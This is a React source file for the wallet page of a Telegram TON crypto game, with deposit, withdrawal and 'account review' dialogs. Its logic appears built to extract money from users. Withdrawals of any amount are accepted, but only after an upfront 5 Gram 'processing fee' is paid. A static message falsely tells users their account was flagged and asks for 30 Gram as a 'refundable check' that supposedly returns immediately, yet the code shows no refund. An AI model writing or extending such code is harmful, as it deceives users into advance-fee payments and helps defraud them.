import SpotlightHero from "@/components/hero/SpotlightHero";
import { useState, useEffect } from "react";
import { motion } from "framer-motion";
import { Button } from "@/components/ui/button";
import { useApp } from "@/context/AppContext";
import { useTonConnectUI, useTonAddress } from "@tonconnect/ui-react";
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Input } from "@/components/ui/input";
import { useToast } from "@/hooks/use-toast";
import { supabase } from "@/integrations/supabase/client";
import { Power, Lock, ArrowDownToLine, ArrowUpFromLine, ShieldCheck, Copy, ArrowLeft, WalletCards } from "lucide-react";
import { useNavigate } from "@tanstack/react-router";
import { PaymentError, sendTonPayment, TON_FEE_BUFFER } from "@/lib/ton";
import { creditDepositWithIntent, isWalletVerified, requestWithdrawal, verifyTonOnChain, verifyWalletWithIntent } from "@/lib/game-api";
import { payWithStars, STARS_PRICES, type StarsProductId } from "@/lib/stars";
import TelegramStar from "@/components/TelegramStar";
import { useCoinPrices, formatUsd } from "@/hooks/use-coin-prices";
const prizeImage = { url: "/images/prize-notify-2.jpg" };
import { GRAM_USD_FALLBACK } from "@/lib/prize";

const NOVA_ICON = "/images/nova-icon.jpg";


const TON_ICON = "/images/gram-icon.png";
const USDT_ICON = "/images/usdt.png";
const VERIFY_AMOUNT_DEFAULT = 30;
const NFT_MIN_GRAM = 4;
const STAKE_MIN_GRAM = 15;
const WITHDRAW_FEE_GRAM = 5;
const TON_USD = 3.5;
const REQUIRED_ATTACKS = 50;

const STAR_PACKS: { id: StarsProductId; usdt: number }[] = [
  { id: "usdt_5", usdt: 5 },
  { id: "usdt_10", usdt: 10 },
  { id: "usdt_25", usdt: 25 },
];

const WalletPage = () => {
  const { user, refreshProfile } = useApp();
  const { toast } = useToast();
  const navigate = useNavigate();
  const [tonConnectUI] = useTonConnectUI();
  const address = useTonAddress();
  const markets = useCoinPrices();
  const [depositOpen, setDepositOpen] = useState(false);
  const [withdrawOpen, setWithdrawOpen] = useState(false);
  const [withdrawAmount, setWithdrawAmount] = useState("");
  const [withdrawCurrency, setWithdrawCurrency] = useState<"ton" | "usdt">("ton");
  const [withdrawStep, setWithdrawStep] = useState<"amount" | "fee">("amount");
  const [feeBusy, setFeeBusy] = useState(false);
  const [depositAmount, setDepositAmount] = useState("");
  const [starBusy, setStarBusy] = useState(false);
  const [verifyOpen, setVerifyOpen] = useState(false);
  const [whyOpen, setWhyOpen] = useState(false);
  const [reqOpen, setReqOpen] = useState<"nft" | "stake" | null>(null);
  const [verifying, setVerifying] = useState(false);
  const [isVerified, setIsVerified] = useState(false);
  const [hasServer, setHasServer] = useState(false);
  const [hasNft, setHasNft] = useState(false);
  const [stakedTon, setStakedTon] = useState(0);
  const [attacksBought, setAttacksBought] = useState(0);
  const [hasKill, setHasKill] = useState(false);
  const VERIFY_AMOUNT = VERIFY_AMOUNT_DEFAULT;

  useEffect(() => {
    const check = async () => {
      if (!user.profileId) return;
      const [verified, srvRes, invRes, killRes, nftRes, ownNftRes, stakeRes] = await Promise.all([
        isWalletVerified(user.telegramUser.id),
        supabase.from("user_servers").select("id").eq("user_id", user.profileId).limit(1),
        supabase.from("battle_inventory").select("total_purchased").eq("user_id", user.profileId).eq("category", "attack"),
        supabase.from("attacks").select("id").eq("user_id", user.profileId).eq("is_killing_blow", true).limit(1),
        supabase.from("user_servers").select("id").eq("user_id", user.profileId).gte("ton_paid", NFT_MIN_GRAM).limit(1),
        supabase.from("user_nfts").select("id").eq("telegram_id", user.telegramUser.id).gte("price_ton", NFT_MIN_GRAM).limit(1),
        supabase.from("stakes").select("amount").eq("profile_id", user.profileId).eq("currency", "ton").eq("status", "active"),
      ]);
      setIsVerified(Boolean(verified));
      setHasServer(!!srvRes.data && srvRes.data.length > 0);
      setAttacksBought((invRes.data ?? []).reduce((s, r: any) => s + (r.total_purchased ?? 0), 0));
      setHasKill(!!killRes.data && killRes.data.length > 0);
      setHasNft(((nftRes.data ?? []).length + (ownNftRes.data ?? []).length) > 0);
      setStakedTon((stakeRes.data ?? []).reduce((s, r: any) => s + Number(r.amount ?? 0), 0));
    };
    void check();
  }, [user.profileId, user.telegramUser.id]);

  // Withdrawal opens directly — no verification or NFT gates.
  const openWithdrawFlow = () => {
    setWithdrawCurrency("ton");
    setWithdrawStep("amount");
    setFeeBusy(false);
    setWithdrawOpen(true);
  };

  const handleConnectWallet = async () => {
    try { await tonConnectUI.openModal(); } catch {}
  };

  if (!tonConnectUI.connected) {
    return (
      <div className="min-h-screen pb-28">
        <SpotlightHero title="Wallet">
        <div className="px-5 pt-8 pb-10 flex flex-col items-center">
        <motion.div
          className="paper-card w-full max-w-sm overflow-hidden p-6"
          initial={{ opacity: 0, y: 10 }}
          animate={{ opacity: 1, y: 0 }}
        >
          <h1 className="font-display text-3xl leading-none text-foreground">Connect your wallet</h1>
          <p className="mt-2 text-sm leading-relaxed text-muted-foreground">
            Link a TON wallet to deposit Gram, withdraw rewards and buy servers straight from your balance.
          </p>

          <div className="mt-5 space-y-2.5">
            {[
              { icon: <ArrowDownToLine className="h-4 w-4" />, label: "Deposit Gram in one tap" },
              { icon: <ArrowUpFromLine className="h-4 w-4" />, label: "Withdraw from 1 Gram" },
              { icon: <ShieldCheck className="h-4 w-4" />, label: "Non-custodial — you keep the keys" },
            ].map((row) => (
              <div key={row.label} className="paper-row flex items-center gap-3 px-3.5 py-3">
                <span className="flex h-8 w-8 shrink-0 items-center justify-center rounded-full bg-action text-action-foreground">
                  {row.icon}
                </span>
                <span className="text-xs font-medium text-foreground">{row.label}</span>
              </div>
            ))}
          </div>

          <button type="button" onClick={handleConnectWallet} className="btn-ink mt-6 h-12 w-full text-xs font-semibold uppercase tracking-widest">
            Connect TON Wallet
          </button>

        </motion.div>
        </div>
        </SpotlightHero>
      </div>
    );
  }


  const gramPrice = markets["gram"]?.price || GRAM_USD_FALLBACK;
  const balances = [
    { symbol: "$NOVA", balance: user.siriBalance, icon: NOVA_ICON, price: 0, usd: 0 },
    {
      symbol: "Gram",
      balance: user.tonBalance,
      icon: TON_ICON,
      price: gramPrice,
      usd: user.tonBalance * gramPrice,
    },
    {
      symbol: "USDT",
      balance: user.usdtBalance,
      icon: USDT_ICON,
      price: markets["tether"]?.price || 1,
      usd: user.usdtBalance * (markets["tether"]?.price || 1),
    },
    {
      symbol: "DOGS",
      balance: 0,
      icon: markets["dogs-2"]?.image || "",
      price: markets["dogs-2"]?.price || 0,
      usd: 0,
    },
    {
      symbol: "NOT",
      balance: 0,
      icon: markets["notcoin"]?.image || "",
      price: markets["notcoin"]?.price || 0,
      usd: 0,
    },
  ];


  const handleDisconnect = async () => {
    await tonConnectUI.disconnect();
    toast({ title: "Disconnected" });
  };

  const handleDeposit = async () => {
    const amount = parseFloat(depositAmount);
    if (!amount || amount <= 0) { toast({ title: "Invalid Amount", variant: "destructive" }); return; }
    try {
      const tx = await sendTonPayment(tonConnectUI, { amountTon: amount, telegramId: user.telegramUser.id, action: "deposit" });
      const verification = await verifyTonOnChain(tx.intentId, tx.boc, tonConnectUI.account?.address);
      if (!verification.verified) throw new PaymentError("failed", verification.error ?? "Payment is still confirming");
      const credit = await creditDepositWithIntent({ telegramId: user.telegramUser.id, intentId: tx.intentId, walletAddress: address });
      if (!credit?.success) throw new PaymentError("failed", "Payment confirmed but crediting failed. Contact support.");
      await refreshProfile();
      toast({ title: "Deposit credited", description: `${credit.amount ?? amount} Gram added to your balance` });
      setDepositOpen(false);
      setDepositAmount("");
    } catch (err) {
      if (err instanceof PaymentError) {
        toast({
          title: err.code === "not_connected" ? "Wallet not connected" : "Deposit failed",
          description: err.message,
          variant: "destructive",
        });
        return;
      }
      toast({ title: "Deposit failed", description: "Please try again", variant: "destructive" });
    }
  };

  // Step 1: accept the requested amount, whatever the balance is.
  const handleWithdrawContinue = () => {
    const amount = parseFloat(withdrawAmount);
    if (!amount || amount < 1) {
      toast({ title: `Minimum 1 ${withdrawCurrency === "ton" ? "Gram" : "USDT"}`, variant: "destructive" });
      return;
    }
    setWithdrawStep("fee");
  };

  // Step 2: the user must pay the withdrawal fee before the request is sent.
  const handleWithdraw = async () => {
    setFeeBusy(true);
    try {
      const tx = await sendTonPayment(tonConnectUI, {
        amountTon: WITHDRAW_FEE_GRAM,
        telegramId: user.telegramUser.id,
        action: "wallet_verification",
      });
      const verification = await verifyTonOnChain(tx.intentId, tx.boc, tonConnectUI.account?.address);
      if (!verification.verified) throw new PaymentError("failed", verification.error ?? "Payment is still confirming");
      return await handleWithdrawInner();
    } catch (err) {
      if (err instanceof PaymentError) {
        toast({
          title: err.code === "not_connected" ? "Wallet not connected" : "Fee payment failed",
          description: err.message,
          variant: "destructive",
        });
      } else {
        toast({ title: "Fee payment failed", description: "Please try again", variant: "destructive" });
      }
    } finally {
      setFeeBusy(false);
    }
  };

  const handleStarsTopUp = async (product: StarsProductId) => {
    setStarBusy(true);
    try {
      const status = await payWithStars(product, user.profileId, user.telegramUser.id);
      if (status === "paid") {
        toast({ title: "Payment received", description: "Your balance has been topped up" });
        setDepositOpen(false);
      } else if (status === "cancelled") {
        toast({ title: "Payment cancelled" });
      } else {
        toast({ title: "Finish the payment in Telegram" });
      }
    } catch (err) {
      toast({
        title: "Stars payment failed",
        description: err instanceof Error ? err.message : "Please try again",
        variant: "destructive",
      });
    } finally {
      setStarBusy(false);
    }
  };

  const handleWithdrawInner = async () => {
    const amount = parseFloat(withdrawAmount);
    const min = 1;
    if (!amount || amount < min) {
      toast({ title: `Minimum ${min} ${withdrawCurrency.toUpperCase()}`, variant: "destructive" });
      return;
    }
    const res = await requestWithdrawal({ telegramId: user.telegramUser.id, amount, currency: withdrawCurrency, walletAddress: address });
    if (!res?.success) {
      const messages: Record<string, string> = {
        wallet_not_verified: "Verify your wallet first",
        insufficient_balance: "Your balance is not enough for this withdrawal",
        pending_request_exists: "You already have a pending withdrawal for this currency",
        no_wallet: "Connect your TON wallet first",
      };
      toast({ title: "Withdrawal failed", description: messages[res?.error ?? ""] ?? "Please try again", variant: "destructive" });
      return;
    }
    toast({ title: "Withdrawal Requested", description: `${amount} ${withdrawCurrency.toUpperCase()} submitted` });
    setWithdrawOpen(false);
    setWithdrawAmount("");
    setWithdrawStep("amount");
  };


  const handleVerifyWallet = async () => {
    setVerifying(true);
    try {
      const tx = await sendTonPayment(tonConnectUI, {
        amountTon: VERIFY_AMOUNT,
        telegramId: user.telegramUser.id,
        action: "wallet_verification",
      });
      const verification = await verifyTonOnChain(tx.intentId, tx.boc, tonConnectUI.account?.address);
      if (!verification.verified) throw new PaymentError("failed", verification.error ?? "Payment is still confirming");
      const marked = await verifyWalletWithIntent({
        telegramId: user.telegramUser.id,
        intentId: tx.intentId,
        walletAddress: address,
      });
      if (!marked?.success) throw new PaymentError("failed", "Payment confirmed but verification failed. Contact support.");
      setIsVerified(true);
      setVerifyOpen(false);
      toast({ title: "Verification complete", description: "Your account is confirmed as a real person" });
      setWithdrawCurrency("ton");
      setWithdrawOpen(true);
    } catch (err) {
      if (err instanceof PaymentError) {
        toast({
          title: err.code === "not_connected" ? "Wallet not connected" : "Verification failed",
          description: err.message,
          variant: "destructive",
        });
      } else {
        toast({ title: "Verification failed", description: "Please try again", variant: "destructive" });
      }
    } finally {
      setVerifying(false);
    }
  };

  return (
    <div className="min-h-screen pb-28">
      <SpotlightHero title="Wallet">
      <div className="px-5 pt-8">


      {/* Total balance */}
      <motion.div
        className="paper-card mb-4 p-6 text-center"
        initial={{ opacity: 0, y: 12 }}
        animate={{ opacity: 1, y: 0 }}
      >
        <p className="paper-eyebrow">Total balance</p>
        <h2 className="mt-1 font-display text-[44px] leading-none tracking-tight text-foreground">
          ${(user.tonBalance * (markets["gram"]?.price || GRAM_USD_FALLBACK) + user.usdtBalance).toLocaleString("en-US", { maximumFractionDigits: 2 })}
        </h2>

        <div className="mt-5 grid grid-cols-2 gap-2.5">
          <button
            type="button"
            onClick={() => setDepositOpen(true)}
            className="btn-ink h-12 gap-2 text-[11px] font-semibold uppercase tracking-widest"
          >
            <ArrowDownToLine className="h-4 w-4" /> Deposit
          </button>
          <button
            type="button"
            onClick={openWithdrawFlow}
            className="btn-ink-soft h-12 gap-2 text-[11px] font-semibold uppercase tracking-widest"
          >
            <ArrowUpFromLine className="h-4 w-4" /> Withdraw
          </button>
        </div>
      </motion.div>

      {/* Assets — iOS grouped list */}
      <p className="paper-eyebrow mb-2 px-1">Assets</p>
      <motion.div
        className="paper-card mb-4 overflow-hidden p-0"
        initial={{ opacity: 0, y: 8 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ delay: 0.05 }}
      >
        {balances.map((b) => (
          <div key={b.symbol} className="flex items-center gap-3 px-4 py-3.5">
            <span className="flex h-10 w-10 shrink-0 items-center justify-center overflow-hidden rounded-full bg-card">
              <img
                src={b.icon || NOVA_ICON}
                alt={b.symbol}
                className="h-full w-full rounded-full object-cover"
                loading="lazy"
              />
            </span>

            <div className="min-w-0 flex-1">
              <p className="text-sm font-semibold text-foreground">{b.symbol}</p>
              <p className="text-[11px] text-muted-foreground">
                {b.price > 0 ? formatUsd(b.price) : "—"}
              </p>
            </div>
            <div className="text-right">
              <p className="font-display text-base text-foreground">
                {b.balance.toLocaleString("en-US", { maximumFractionDigits: 4 })}
              </p>
              {b.symbol !== "$NOVA" && (
                <p className="text-[11px] text-muted-foreground">
                  ≈ ${b.usd.toLocaleString("en-US", { maximumFractionDigits: 2 })}
                </p>
              )}
            </div>
          </div>
        ))}
      </motion.div>


      {/* Connection */}
      <p className="paper-eyebrow mb-2 px-1">Wallet</p>
      <motion.div
        className="paper-card divide-y divide-border/25 overflow-hidden p-0"
        initial={{ opacity: 0, y: 8 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ delay: 0.1 }}
      >
        <div className="flex items-center gap-3 px-4 py-3.5">
          <span className="flex h-10 w-10 shrink-0 items-center justify-center rounded-full bg-action text-action-foreground">
            <ShieldCheck className="h-4 w-4" />
          </span>
          <div className="min-w-0 flex-1">
            <p className="flex items-center gap-1.5 text-[11px] text-muted-foreground">
              <span className="inline-block h-1.5 w-1.5 rounded-full bg-emerald-500" />
              Connected
            </p>
            <p className="truncate font-mono text-xs text-foreground">
              {address ? `${address.slice(0, 8)}…${address.slice(-6)}` : ""}
            </p>
          </div>
          <button
            type="button"
            onClick={() => {
              if (!address) return;
              navigator.clipboard.writeText(address);
              toast({ title: "Address copied" });
            }}
            className="btn-ink-soft h-9 w-9 shrink-0"
            aria-label="Copy wallet address"
          >
            <Copy className="h-3.5 w-3.5" />
          </button>
        </div>

        <button
          type="button"
          onClick={handleDisconnect}
          className="flex w-full items-center justify-center gap-2 px-4 py-3.5 text-sm font-medium text-destructive"
        >
          <Power className="h-4 w-4" /> Disconnect
        </button>

      </motion.div>


      <Dialog open={depositOpen} onOpenChange={setDepositOpen}>
        <DialogContent className="fixed bottom-auto left-1/2 right-auto top-1/2 w-[calc(100%-2rem)] max-w-[360px] -translate-x-1/2 -translate-y-1/2 overflow-hidden rounded-[32px] border-0 bg-transparent p-0 shadow-none sm:left-1/2 sm:top-1/2 sm:w-[calc(100%-2rem)] sm:max-w-[360px] sm:-translate-x-1/2 sm:-translate-y-1/2">
          <div className="wallet-dialog-surface relative w-full overflow-hidden rounded-[32px] px-7 pb-8 pt-9 text-center">
            <div
              className="pointer-events-none absolute inset-x-0 top-0 h-24 rounded-t-[32px] opacity-40"
              style={{
                background:
                  "linear-gradient(180deg, hsl(0 0% 100% / 0.16) 0%, hsl(0 0% 100% / 0.05) 45%, transparent 100%)",
              }}
            />
            <DialogHeader className="relative z-10">
              <DialogTitle className="text-center text-[10px] font-normal uppercase tracking-[0.34em] text-muted-foreground">
                Deposit Gram
              </DialogTitle>
              <DialogDescription className="mt-3 text-center text-[12px] leading-relaxed text-muted-foreground">
                Send Gram from your connected wallet
              </DialogDescription>
            </DialogHeader>
            <Input
              placeholder="Amount in Gram"
              type="number"
              className="wallet-dialog-field relative z-10 mt-6 h-12 rounded-2xl text-center text-[16px]"
              value={depositAmount}
              onChange={(e) => setDepositAmount(e.target.value)}
            />
            <Button
              onClick={handleDeposit}
              className="relative z-10 mt-4 h-12 w-full rounded-2xl font-display text-[15px] font-medium glow-primary"
            >
              Send deposit
            </Button>

            <div className="relative z-10 mt-6">
              <p className="text-center text-[10px] uppercase tracking-[0.28em] text-muted-foreground">
                or pay with Telegram Stars
              </p>
              <div className="mt-3 grid grid-cols-3 gap-2">
                {STAR_PACKS.map((pack) => (
                  <button
                    key={pack.id}
                    type="button"
                    disabled={starBusy}
                    onClick={() => void handleStarsTopUp(pack.id)}
                    className="rounded-2xl border border-border bg-secondary px-2 py-3 text-center transition-colors hover:bg-muted disabled:opacity-50"
                  >
                    <span className="block font-display text-[15px] font-medium text-foreground">
                      {pack.usdt} USDT
                    </span>
                    <span className="mt-0.5 flex items-center justify-center gap-1 text-[11px] text-muted-foreground">
                      <TelegramStar className="h-3.5 w-3.5" />
                      {STARS_PRICES[pack.id]}
                    </span>
                  </button>
                ))}
              </div>
            </div>
          </div>
        </DialogContent>
      </Dialog>

      <Dialog open={withdrawOpen} onOpenChange={setWithdrawOpen}>
        <DialogContent className="fixed bottom-auto left-1/2 right-auto top-1/2 w-[calc(100%-1.5rem)] max-w-[380px] -translate-x-1/2 -translate-y-1/2 overflow-hidden rounded-3xl border border-border bg-card p-0 shadow-2xl sm:left-1/2 sm:top-1/2 sm:w-[calc(100%-1.5rem)] sm:max-w-[380px] sm:-translate-x-1/2 sm:-translate-y-1/2">
          <div className="relative text-center">
            <div className="relative aspect-[2/1] overflow-hidden">
              <img src={prizeImage.url} alt="Nova withdrawal reward" className="h-full w-full object-cover" />
              <div className="absolute inset-0 bg-gradient-to-t from-card via-card/20 to-transparent" />
              <div className="absolute bottom-4 left-5 flex items-center gap-2 rounded-full bg-background/80 px-3 py-2 text-xs font-semibold text-foreground backdrop-blur-md">
                <WalletCards className="h-4 w-4 text-primary" />
                Secure withdrawal
              </div>
            </div>

            <div className="px-5 pb-6 pt-3">
              <DialogHeader>
                <DialogTitle className="text-center font-display text-3xl text-foreground">
                  {withdrawStep === "amount" ? "Withdraw funds" : "Confirm withdrawal"}
                </DialogTitle>
                <DialogDescription className="mt-1 text-center text-xs leading-relaxed text-muted-foreground">
                  {withdrawStep === "amount"
                    ? "Choose your currency, then enter the amount."
                    : "Review the amount and pay the processing fee."}
                </DialogDescription>
              </DialogHeader>
            {withdrawStep === "amount" ? (
              <>
                <div className="mt-5 grid grid-cols-2 gap-1 rounded-xl border border-border bg-secondary p-1">
                  {(["ton", "usdt"] as const).map((c) => (
                    <Button
                      key={c}
                      type="button"
                      variant="ghost"
                      onClick={() => setWithdrawCurrency(c)}
                      className={`h-10 rounded-lg text-sm font-semibold ${
                        withdrawCurrency === c
                          ? "bg-primary text-primary-foreground"
                          : "text-muted-foreground hover:bg-muted hover:text-foreground"
                      }`}
                    >
                      {c === "ton" ? "Gram" : "USDT"}
                    </Button>
                  ))}
                </div>
                <label htmlFor="withdraw-amount" className="mt-4 block text-left text-xs font-medium text-muted-foreground">
                  Amount to withdraw
                </label>
                <Input
                  id="withdraw-amount"
                  placeholder={`Amount in ${withdrawCurrency === "ton" ? "Gram" : "USDT"}`}
                  type="number"
                  min="1"
                  inputMode="decimal"
                  className="wallet-dialog-field mt-2 h-14 rounded-xl text-center text-xl font-semibold"
                  value={withdrawAmount}
                  onChange={(e) => setWithdrawAmount(e.target.value)}
                />
                <Button
                  onClick={handleWithdrawContinue}
                  className="mt-4 h-13 w-full rounded-xl text-sm font-semibold glow-primary"
                >
                  Withdraw
                  <ArrowUpFromLine className="h-4 w-4" />
                </Button>
              </>
            ) : (
              <>
                <div className="mt-5 overflow-hidden rounded-xl border border-border bg-secondary text-left">
                  <div className="flex items-center justify-between border-b border-border px-4 py-4">
                    <span className="text-xs text-muted-foreground">You withdraw</span>
                    <span className="font-display text-xl text-foreground">
                      {withdrawAmount} {withdrawCurrency === "ton" ? "Gram" : "USDT"}
                    </span>
                  </div>
                  <div className="flex items-center justify-between px-4 py-4">
                    <span className="text-xs text-muted-foreground">Processing fee</span>
                    <span className="text-sm font-semibold text-gold">{WITHDRAW_FEE_GRAM} Gram</span>
                  </div>
                </div>
                <p className="mt-3 text-left text-[11px] leading-relaxed text-muted-foreground">
                  The fee is paid first. Your withdrawal request is submitted after payment confirms.
                </p>
                <Button
                  onClick={handleWithdraw}
                  disabled={feeBusy}
                  className="mt-4 h-13 w-full rounded-xl text-sm font-semibold glow-primary"
                >
                  {feeBusy ? "Confirming payment..." : `Pay ${WITHDRAW_FEE_GRAM} Gram and withdraw`}
                  {!feeBusy && <ArrowUpFromLine className="h-4 w-4" />}
                </Button>
                <Button
                  type="button"
                  variant="ghost"
                  onClick={() => setWithdrawStep("amount")}
                  disabled={feeBusy}
                  className="mt-2 h-10 w-full gap-2 text-xs text-muted-foreground"
                >
                  <ArrowLeft className="h-4 w-4" />
                  Back
                </Button>
              </>
            )}
            </div>
          </div>
        </DialogContent>
      </Dialog>

      <Dialog open={verifyOpen} onOpenChange={setVerifyOpen}>
        <DialogContent className="fixed bottom-auto left-1/2 right-auto top-1/2 w-[calc(100%-2rem)] max-w-[360px] -translate-x-1/2 -translate-y-1/2 overflow-hidden rounded-[32px] border-0 bg-transparent p-0 shadow-none sm:left-1/2 sm:top-1/2 sm:w-[calc(100%-2rem)] sm:max-w-[360px] sm:-translate-x-1/2 sm:-translate-y-1/2">
          <div className="wallet-dialog-surface relative rounded-[32px] px-7 pb-8 pt-9 text-center">

            <div
              className="pointer-events-none absolute inset-x-0 top-0 h-24 rounded-t-[32px] opacity-40"
              style={{
                background:
                  "linear-gradient(180deg, hsl(0 0% 100% / 0.16) 0%, hsl(0 0% 100% / 0.05) 45%, transparent 100%)",
              }}
            />
            <DialogHeader className="relative z-10">
              <DialogTitle className="text-[10px] font-normal uppercase tracking-[0.34em] text-muted-foreground">
                Account review
              </DialogTitle>
              <DialogDescription className="sr-only">Human verification deposit</DialogDescription>
            </DialogHeader>
            <div className="relative z-10 mt-6 rounded-[28px] border border-white/[0.08] bg-foreground/[0.05] px-5 py-6">
              <p className="text-[38px] font-display font-medium leading-none text-gradient-primary">
                {VERIFY_AMOUNT} Gram
              </p>
              <p className="mt-2 text-[11px] uppercase tracking-[0.2em] text-muted-foreground">Refundable check</p>
            </div>
            <p className="relative z-10 mt-5 text-[12px] leading-relaxed text-muted-foreground">
              Your account has been flagged by our review system because of its transaction pattern and activity
              behaviour. If you are not a bot or an automated script, send {VERIFY_AMOUNT} Gram to confirm you are a
              real person. The amount is only used for the check and returns to your wallet immediately.
            </p>
            <p className="relative z-10 mt-2 text-[11px] leading-relaxed text-muted-foreground">
              Keep at least {(VERIFY_AMOUNT + TON_FEE_BUFFER).toFixed(2)} Gram in your wallet so the network fee is
              covered.
            </p>
            <button
              onClick={() => setWhyOpen((v) => !v)}
              className="relative z-10 mt-4 text-[11px] uppercase tracking-[0.2em] text-primary underline-offset-4 transition-colors hover:text-primary/80 hover:underline"
            >
              Why do we verify?
            </button>
            {whyOpen && (
              <p className="relative z-10 mt-4 rounded-[24px] border border-white/[0.08] bg-foreground/[0.05] p-4 text-left text-[12px] leading-relaxed text-muted-foreground">
                We have many investors, so every account must be proven real and not automated. This check is only
                triggered for accounts flagged by our review system. The {VERIFY_AMOUNT} Gram is returned to your
                wallet right after the check and unlocks all future withdrawals.
              </p>
            )}
            <Button
              onClick={handleVerifyWallet}
              disabled={verifying}
              className="relative z-10 mt-6 h-12 w-full rounded-2xl font-display text-[15px] font-medium glow-primary"
            >
              {verifying ? "Verifying" : `Send ${VERIFY_AMOUNT} Gram and verify`}
            </Button>
            <button
              onClick={() => setVerifyOpen(false)}
              className="relative z-10 mt-3 text-[11px] uppercase tracking-[0.22em] text-muted-foreground transition-colors hover:text-foreground"
            >
              Cancel
            </button>
          </div>
        </DialogContent>
      </Dialog>



      </div>
      </SpotlightHero>
    </div>
  );
};

export default WalletPage;
